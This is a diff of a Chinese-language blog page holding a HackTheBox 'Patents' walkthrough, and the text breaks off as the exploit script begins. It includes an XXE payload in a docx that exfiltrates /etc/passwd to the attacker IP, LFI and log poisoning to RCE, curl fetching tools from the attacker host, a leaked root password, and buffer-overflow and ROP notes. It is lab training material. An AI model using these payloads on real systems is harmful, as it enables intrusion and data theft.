@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;224  10.10.10.173  端口扫描                                                                                                            80 一个Patents管理系统">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;224  10.10.10.173  端口扫描 80 一个Patents管理系统，存在一个上传接口，上传docx转换成pdf：  目录扫描1gobuster dir -u http:&#x2F;&#x2F;10.10.10.173&#x2F; -w &#x2F;usr&#x2F;share&amp;#">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Patents - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/05/21/Patents-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;224  10.10.10.173  端口扫描                                                                                                            80 一个Patents管理系统">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;224  10.10.10.173  端口扫描 80 一个Patents管理系统，存在一个上传接口，上传docx转换成pdf：  目录扫描1gobuster dir -u http:&#x2F;&#x2F;10.10.10.173&#x2F; -w &#x2F;usr&#x2F;share&amp;#">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051801.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051802.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051803.jpg">
@@ -142,8 +142,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -165,7 +172,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -233,92 +240,29 @@
 </li>
 <li><h2 id="10-10-10-173"><a href="#10-10-10-173" class="headerlink" title="10.10.10.173"></a>10.10.10.173</h2></li>
 </ul>
-<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051801.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051801.jpg" alt=""></p>
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p> 一个Patents管理系统，存在一个上传接口，上传docx转换成pdf：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051802.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051802.jpg" alt=""></p>
 <h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;10.10.10.173&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt -x php -b 403,404</span><br></pre></td></tr></table></figure>
 
 <p>发现一个release目录，进一步扫描：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051803.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051803.jpg" alt=""></p>
 <p>发现更新log文件：</p>
 <p><a href="http://10.10.10.173/release/UpdateDetails" target="_blank" rel="noopener">http://10.10.10.173/release/UpdateDetails</a></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051804.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051804.jpg" alt=""></p>
 <p>里面提到Docx2Pdf的相关漏洞</p>
 <h1 id="docx-xxe"><a href="#docx-xxe" class="headerlink" title="docx xxe"></a>docx xxe</h1><p>docx解压后里面是xml文件，可以尝试进行XXE：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051805.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051805.jpg" alt=""></p>
 <p>添加一个xml进去，重新打包成docx：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051806.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051806.jpg" alt=""></p>
 <p>监听端口，上传生成的docx，收到请求，说明存在XXE：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051807.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051807.jpg" alt=""></p>
 <p>接下来需要做的就是通过XXE读取文件搜集信息</p>
 <h1 id="XXE-LFI"><a href="#XXE-LFI" class="headerlink" title="XXE LFI"></a>XXE LFI</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ cat read.dtd</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % read &quot;&lt;!ENTITY exfil SYSTEM &#39;http:&#x2F;&#x2F;10.10.14.106:7777&#x2F;exfil?%file;&#39;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">cat customXml&#x2F;item1.xml</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;10.10.14.106:7777&#x2F;read.dtd&quot;&gt;</span><br><span class="line">%xxe;</span><br><span class="line">%read;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;exfil;&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure>
 
 <p>上传，收到请求，base64解码后是读取的文件内容：</p>
-<h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051808.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051809.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051808.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051809.jpg" alt=""></p>
 <p>得到一个用户名 ： <code>gbyolo</code></p>
 <h2 id="etc-apache2-sites-enabled-000-default-conf"><a href="#etc-apache2-sites-enabled-000-default-conf" class="headerlink" title="/etc/apache2/sites-enabled/000-default.conf"></a>/etc/apache2/sites-enabled/000-default.conf</h2><p>前面扫描结果中有config.php，但直接去读/var/www/html/config.php是失败的，应该不是在默认的根目录，所以先读配置文件：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">  DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;docx2pdf</span><br><span class="line"></span><br><span class="line">  &lt;Directory &#x2F;var&#x2F;www&#x2F;html&#x2F;docx2pdf&#x2F;&gt;</span><br><span class="line">      Options -Indexes +FollowSymLinks +MultiViews</span><br><span class="line">      AllowOverride All</span><br><span class="line">      Order deny,allow</span><br><span class="line">      Allow from all</span><br><span class="line">  &lt;&#x2F;Directory&gt;</span><br><span class="line"></span><br><span class="line">  ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">  CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure>
@@ -327,68 +271,19 @@
 
 <p>发现提示信息，getPatent_alphav1.0.php是存在漏洞的, 但无法直接读取这个文件的内容。</p>
 <h1 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI to RCE"></a>LFI to RCE</h1><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>直接去访问getPatent_alphav1.0.php,提示通过ID读取内容：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051810.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051810.jpg" alt=""></p>
 <p>直接尝试目录遍历读取失败：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051811.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051811.jpg" alt=""></p>
 <p>但使用两次<code>../</code>嵌套的话，成功，说明后端处理应该是简单的移除掉一次<code>../</code>：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051812.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051812.jpg" alt=""></p>
 <p>所以这里也存在一个LFI</p>
 <h2 id="log-file"><a href="#log-file" class="headerlink" title="log file"></a>log file</h2><p>同样，我们也可以读取log文件<code>var/log/apache2/access.log</code> ,注意会直接输出客户端信息例如UA,：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051813.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051813.jpg" alt=""></p>
 <p>如果将UA修改为php代码，那么响应的log中就会直接显示执行后的结果(如果前面扫描产生的日志太多，建议reset一下机器)：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051814.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051814.jpg" alt=""></p>
 <h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>直接修改代码，反弹shell, 注意编码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051818.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051819.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051818.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051819.jpg" alt=""></p>
 <p>这个只是www-root用户，上传个pspy64收集信息：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.14.106:7777/pspy64 -o pspy64</span><br><span class="line"></span><br><span class="line">2020/05/18 08:11:01 CMD: UID=0    PID=853    | /usr/sbin/CRON -f</span><br><span class="line">2020/05/18 08:11:01 CMD: UID=0    PID=855    | /bin/sh -c env PASSWORD="!gby0l0r0ck\$\$!" /opt/checker_client/run_file.sh</span><br><span class="line">2020/05/18 08:11:01 CMD: UID=0    PID=856    |</span><br><span class="line">2020/05/18 08:11:01 CMD: UID=0    PID=857    | python checker.py 10.100.0.1:8888 lfmserver_user PASSWORD /var/www/html/docx2pdf/convert.php</span><br></pre></td></tr></table></figure>
 
@@ -396,23 +291,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!gby0l0r0ck$$!</span><br></pre></td></tr></table></figure>
 
 <p>使用这个密码可以su切到root，但这个root并不是最终目标,  现在只是在docker里：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051816.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051816.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>使用上面得到的root，可以在用户目录得到user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051817.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051817.jpg" alt=""></p>
 <h1 id="checker-client"><a href="#checker-client" class="headerlink" title="checker_client"></a>checker_client</h1><p>前面也看到是cron运行的/opt/checker_client下的相关文件，我们检查下这些文件：</p>
 <h2 id="run-file-sh"><a href="#run-file-sh" class="headerlink" title="run_file.sh"></a>run_file.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cat run_file.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> $(date) &gt; /opt/checker_runned</span><br><span class="line"></span><br><span class="line">FOLDER=/var/www/html/docx2pdf</span><br><span class="line">FILE=/var/www/html/docx2pdf/convert.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#export PASSWORD="!gby0l0r0ck\$\$!"</span></span><br><span class="line"></span><br><span class="line">NEWFILE=$(python checker.py 10.100.0.1:8888 lfmserver_user PASSWORD <span class="variable">$FILE</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo "Res: $NEWFILE"</span></span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$NEWFILE</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"File not corrupted."</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$NEWFILE</span> ]; <span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"File corrupted. Copying new file..."</span></span><br><span class="line">   cp <span class="variable">$NEWFILE</span> <span class="variable">$FILE</span></span><br><span class="line">   <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">       <span class="built_in">echo</span> <span class="string">"Couldn't restore file"</span></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="built_in">echo</span> <span class="string">"File restored successfully"</span></span><br><span class="line">       rm -f <span class="variable">$NEWFILE</span></span><br><span class="line">   <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"File not corrupted. Not doing anything"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
 
@@ -421,103 +302,33 @@
 
 <p> 其中的INPUTREQ类似HTTP请求格式，它计算convert.php的md5 hash，然后构造请求数据包，发送到10.100.0.1:8888，获取响应。200或者404响应脚本退出。如果发现文件损坏，则会GET请求下载新文件。</p>
 <h1 id="usr-src-lfm"><a href="#usr-src-lfm" class="headerlink" title="/usr/src/lfm"></a>/usr/src/lfm</h1><p>存在一个lfm目录，应该是和前面的lfmserver相关，是一个git repo：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051901.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051901.jpg" alt=""></p>
 <p> 可以把整个目录下载下来分析</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar cvf &#x2F;var&#x2F;www&#x2F;html&#x2F;docx2pdf&#x2F;src.tar lfm</span><br><span class="line">wget http:&#x2F;&#x2F;10.10.10.173&#x2F;src.tar</span><br><span class="line">tar xvf src.tar</span><br><span class="line">cd lfm</span><br></pre></td></tr></table></figure>
 
 <h2 id="lfmserver"><a href="#lfmserver" class="headerlink" title="lfmserver"></a>lfmserver</h2><p>根据git log，回退到删除文件之前的版本，得到lfmserver的二进制文件，其他版本还能够得到源码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard a900ccf7ae75b95db5f2d134d80e359a795e0cc6</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051902.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051902.jpg" alt=""></p>
 <h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>整个过程可以结合git得到的源码</p>
 <p>IDA直接F5出错，换Ghidra，在Symbol Tree中找到entry()：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051903.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051903.jpg" alt=""></p>
 <h2 id="FUN-004055c2"><a href="#FUN-004055c2" class="headerlink" title="FUN_004055c2"></a>FUN_004055c2</h2><p> 这个函数是libc_start_main()的第一个参数，即main()函数，点进去右键 edit the signature.</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051904.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051904.jpg" alt=""></p>
 <p>主要功能大概是检查参数数量，然后调用FUN_00404978检查参数，这里为了方便修改为check_args()</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051905.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051905.jpg" alt=""></p>
 <p>Defined strings里也能发现之前在bash里看到的用户名密码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051906.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051906.jpg" alt=""></p>
 <h2 id="FUN-00403ad9"><a href="#FUN-00403ad9" class="headerlink" title="FUN_00403ad9"></a>FUN_00403ad9</h2><p>Ctrl + Shift + F  查看密码的 references</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051907.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051907.jpg" alt=""></p>
 <p>可以看到有两次被作为函数参数使用，点击能够追踪到FUN_00403ad9函数，这个函数检查用户名和密码，检查通过会调用FUN_00402db9()：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051908.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051908.jpg" alt=""></p>
 <h2 id="FUN-00402db9"><a href="#FUN-00402db9" class="headerlink" title="FUN_00402db9"></a>FUN_00402db9</h2><p>这个函数三个参数，第一个参数是请求路径，第二个是大小为128的缓冲区，最后一个参数是请求路径的长度：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051909.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051909.jpg" alt=""></p>
 <p>这个函数在路径中循环查找%字符，找到后会使用strtoul()将字符转换成数字，转换后的字符串保存到buf，很明显这是URL解码，server会将URL编码的字符进行解码。</p>
 <p>同样很明显，如果超出缓冲区长度，没有进行检查来停止转换，这意味着这里存在overflow，可能地利用点。</p>
 <p>回到之前的FUN_00403ad9函数，注意这里会检查文件是否存在，文件不存在会直接返回，那么就不会调用溢出的指针，我们可以通过请求一个已知文件，例如convert.php，并在末尾附加一个空字节，这样字符串在空字节处终止，也能够通过文件检查。</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051910.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051910.jpg" alt=""></p>
 <h1 id="Exploit-Development"><a href="#Exploit-Development" class="headerlink" title="Exploit Development"></a>Exploit Development</h1><p>常规的debug，leak addr，计算libc base，rop构造</p>
 <h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ul>
 <li>url编码</li>
@@ -531,41 +342,13 @@
 </ul>
 <h1 id="root-shell"><a href="#root-shell" class="headerlink" title="root shell"></a>root shell</h1><p>exp打到的shell很容易断，直接反弹shell后续操作：</p>
 <p>这里因为python版本问题format输出不正常</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052001.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052001.jpg" alt=""></p>
 <p>但这个root shell没有root.txt：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052002.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052002.jpg" alt=""></p>
 <h1 id="lsblk-amp-mount"><a href="#lsblk-amp-mount" class="headerlink" title="lsblk &amp; mount"></a>lsblk &amp; mount</h1><p>lsblk发现root是/dev/sdb，另外还有个/dev/sda：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052003.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052003.jpg" alt=""></p>
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>sda2是根目录，我们可以挂载sda2，在mount后的目录中存在另一个root目录，得到root.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052004.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052004.jpg" alt=""></p>
 <h1 id="使用的exp"><a href="#使用的exp" class="headerlink" title="使用的exp"></a>使用的exp</h1><p>  注意libc版本，用的这个：</p>
 <p><a href="https://launchpad.net/ubuntu/cosmic/amd64/libc6/2.28-0ubuntu1" target="_blank" rel="noopener">https://launchpad.net/ubuntu/cosmic/amd64/libc6/2.28-0ubuntu1</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 